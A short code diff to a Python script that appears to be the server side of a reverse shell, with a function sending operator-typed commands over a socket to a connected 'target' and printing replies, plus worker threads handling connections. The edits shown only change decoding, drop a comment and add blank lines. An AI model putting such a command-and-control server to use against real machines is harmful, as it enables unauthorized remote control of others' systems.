@@ -107,7 +107,7 @@ def send_target_commands(conn):
             cmd = input()
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
-                client_response = str(conn.recv(20480), "utf-8")
+                client_response = conn.recv(20480).decode('utf-8').strip()
                 print(client_response, end="")
             if cmd == 'quit':
                 break
@@ -123,7 +123,7 @@ def create_workers():
         t.daemon = True
         t.start()
 
-# do the next job in the queue ( one handle connect, other send command)
+
 def work():
     while True:
         x = queue.get()
@@ -150,4 +150,5 @@ if __name__ == '__main__':
     create_workers()
     # 1 thread to produce
     create_jobs()
+
 
